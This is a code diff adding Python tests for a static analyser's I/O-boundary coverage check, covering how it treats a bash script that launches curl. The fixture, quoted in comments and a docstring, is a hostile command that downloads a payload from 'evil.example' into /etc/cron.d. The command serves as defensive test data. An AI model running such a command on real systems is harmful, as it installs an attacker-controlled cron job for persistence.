@@ -69,7 +69,9 @@ import hypergumbo_core.io_boundary as io_boundary
 import hypergumbo_core.verify_claims as verify_claims
 from hypergumbo_core.io_boundary import (
     CATALOG_BOUNDARY_TYPES,
+    KNOWN_IO_BOUNDARIES,
     OPAQUE_BOUNDARIES,
+    PRODUCER_OPAQUE_BOUNDARIES,
     load_catalog,
 )
 from hypergumbo_core.verify_claims import compute_boundary_coverage
@@ -662,3 +664,168 @@ def _permits(catalog, module: str) -> bool:
         {catalog.language: catalog},
     )
     return coverage.complete
+
+
+#: A two-line shell script whose only external command is
+#: ``curl -o /etc/cron.d/pwned "https://evil.example/payload"``. Captured from an
+#: actual ``analyze_bash`` run over that fixture — every field the gate reads is
+#: verbatim (content-hash ids and the run uuid elided as noise). The terminal
+#: slot is ``unresolved`` rather than ``external_symbol`` because the bash
+#: producer emits an unresolved external-command edge and stamps the boundary
+#: itself; both slots are in ``_EXTERNAL_DST_TERMINAL_SLOTS``.
+BASH_CURL_LAUNCH_EDGES = [
+    {"src": "bash:deploy.sh:1-1:file:file",
+     "dst": "bash:curl:0-0:curl:unresolved",
+     "type": "calls",
+     "is_resolved": False,
+     "dst_ref": {"lang": "bash", "module_path": "curl", "name": "curl"},
+     "meta": {"io_boundary": "command_launch", "io_primitive": "curl",
+              "call_construct": "function"}},
+]
+
+#: The six lines this tree has three times proposed adding as
+#: ``io_primitives/bash.yaml`` (verify_claims.py's own "why the catalogue is the
+#: follow-up" comment, WI-sofaf disposition 2, and a session handoff note). The
+#: row is CORRECT — curl really does send data to a remote host — and that is
+#: precisely the point: a right row buys a wrong verdict.
+_BASH_NET_SEND_ONLY = """\
+language: bash
+status: in_progress
+
+net_send:
+  - module: curl
+    functions: [curl]
+"""
+
+
+def _bash_catalog(tmp_path: Path, text: str):
+    """Parse a bash catalogue through PRODUCTION's loader.
+
+    Hand-constructing an ``IoBoundaryCatalog`` is how the defect this module is
+    named for survived (see the module docstring), so the YAML goes through
+    ``from_yaml``. It has to be written to disk rather than loaded from the
+    shipped tree because there IS no shipped ``bash.yaml`` — ADR-0016:96 rules
+    one out, and this test exists to keep that ruling from being the only thing
+    standing between the tree and a false confirm.
+    """
+    path = tmp_path / "bash.yaml"
+    path.write_text(text, encoding="utf-8")
+    return io_boundary.IoBoundaryCatalog.from_yaml(path)
+
+
+class TestAProducerStampedLaunchIsAlsoOpaque:
+    """INV-larol — opacity must not be a favour the catalogue chooses to do.
+
+    INV-gahuz established that a ``subprocess`` row blocks confirmation of every
+    other boundary, and asked the question of the CATALOGUE. One producer knows
+    a call is an opaque launch with no catalogue at all: the bash analyzer
+    stamps ``meta.io_boundary = "command_launch"`` (bash.py:534) because there
+    is no bash catalogue to match against and, per ADR-0016:96, there is not
+    going to be one. That channel was never consulted.
+
+    NOT LIVE TODAY, AND EXACTLY ONE FILE AWAY FROM BEING SO. bash ships no
+    catalogue, so ``_external_call_sites`` drops its edges on ``catalog is
+    None`` and the INV-dabov language gate answers first. Three places in this
+    tree recommend adding that file. Measured on the shipped CLI, fixture
+    ``curl -o /etc/cron.d/pwned <url>``, claim "never writes to the host
+    filesystem":
+
+        io_primitives/bash.yaml            total_io  cmd_launch  fs_write claim
+        ---------------------------------  --------  ----------  --------------
+        (absent — today)                          0           1  inconclusive 2
+        curl -> net_send                          1           0  CONFIRMED rc 0
+        curl -> net_send + subprocess             1           0  inconclusive 2
+
+    Row 2 is the defect: six correct lines turn an honest ``inconclusive`` into
+    a green tick over a write into ``/etc/cron.d``. Row 3 is the control that
+    makes it a defect rather than blindness — the same run, with opacity ALSO
+    declared, withholds the confirmation and still reports the net_send
+    violation. Detection is not what is at stake; opacity is.
+    """
+
+    def test_a_catalogued_command_does_not_strip_its_launch_opacity(
+        self, tmp_path: Path,
+    ) -> None:
+        catalog = _bash_catalog(tmp_path, _BASH_NET_SEND_ONLY)
+        # PRECONDITION, or this test passes through the INV-dabov language gate
+        # and measures nothing: bash must be a catalogued language here.
+        coverage = compute_boundary_coverage(
+            BASH_CURL_LAUNCH_EDGES, {"bash"}, {"bash": catalog},
+        )
+        assert coverage.complete is False, (
+            "a shell script launching curl hands control to a program whose "
+            "file writes are not in the edge set; a net_send row classifies "
+            "the call without making its OTHER I/O examined (INV-larol)"
+        )
+        assert coverage.reason, "a blocked verdict must state its cause"
+        assert "curl" in coverage.reason, (
+            f"the reason must NAME the launch so a reader can check it against "
+            f"the source; got: {coverage.reason!r}"
+        )
+
+    def test_a_non_opaque_producer_stamp_still_supports_confirmation(
+        self, tmp_path: Path,
+    ) -> None:
+        """THE DISCRIMINATOR. The gate must key on WHICH boundary was stamped,
+        not on the mere presence of a producer stamp — otherwise it degenerates
+        into "any prestamped edge blocks everything", which would be
+        indistinguishable from the fix on the fixture above while being wrong.
+        """
+        edges = [dict(BASH_CURL_LAUNCH_EDGES[0],
+                      meta={"io_boundary": "net_send", "io_primitive": "curl",
+                            "call_construct": "function"})]
+        catalog = _bash_catalog(tmp_path, _BASH_NET_SEND_ONLY)
+        coverage = compute_boundary_coverage(edges, {"bash"}, {"bash": catalog})
+        assert coverage.complete is True, (
+            f"a stamp naming a KNOWN surface is an examined negative exactly as "
+            f"a catalogued row is; got: {coverage.reason!r}"
+        )
+
+    def test_the_producer_channel_is_real_vocabulary_and_not_catalogue_declarable(
+        self,
+    ) -> None:
+        """The mirror of ``test_the_opaque_set_is_declarable_by_a_catalogue``,
+        and it has to be the mirror rather than the same test.
+
+        A catalogue-declarable opaque boundary is inert unless it is in
+        ``CATALOG_BOUNDARY_TYPES``; a PRODUCER-stamped one is inert if it is,
+        because ``_parse_catalog`` iterates exactly that tuple and would then be
+        the channel that carries it. The two sets answer one question through
+        two channels and must stay disjoint. Membership in
+        ``KNOWN_IO_BOUNDARIES`` is the anti-typo check: an unvalidated boundary
+        string is how INV-todas confirmed a claim on a misspelling.
+        """
+        assert PRODUCER_OPAQUE_BOUNDARIES <= KNOWN_IO_BOUNDARIES, (
+            f"not io-boundary vocabulary at all: "
+            f"{sorted(PRODUCER_OPAQUE_BOUNDARIES - KNOWN_IO_BOUNDARIES)}"
+        )
+        assert not (PRODUCER_OPAQUE_BOUNDARIES & set(CATALOG_BOUNDARY_TYPES)), (
+            f"a catalogue CAN declare "
+            f"{sorted(PRODUCER_OPAQUE_BOUNDARIES & set(CATALOG_BOUNDARY_TYPES))}, "
+            f"so it belongs in OPAQUE_BOUNDARIES where declares_opaque_crossing "
+            f"asks every row — not in the producer set"
+        )
+
+    def test_a_launch_without_a_structured_dst_ref_is_still_named(
+        self, tmp_path: Path,
+    ) -> None:
+        """The slot fallback in ``_launch_site_name``, exercised rather than
+        pragma'd.
+
+        Only bash stamps a boundary today and it always sets ``dst_ref``, so
+        this shape is not in the corpus — but the stamp is a PRODUCER CONTRACT,
+        and the next producer to adopt it may satisfy the contract without a
+        structured ref. A launch that cannot be named would otherwise be
+        silently dropped from the disclosure, which is the failure this whole
+        module is about: the gap that reports nothing.
+        """
+        edge = {k: v for k, v in BASH_CURL_LAUNCH_EDGES[0].items()
+                if k != "dst_ref"}
+        catalog = _bash_catalog(tmp_path, _BASH_NET_SEND_ONLY)
+        coverage = compute_boundary_coverage([edge], {"bash"}, {"bash": catalog})
+        assert coverage.complete is False, coverage.reason
+        assert "curl.curl" in coverage.reason, (
+            f"the slot fallback must spell the site exactly as the dst_ref "
+            f"branch does, or one disclosure reads differently from the other; "
+            f"got: {coverage.reason!r}"
+        )
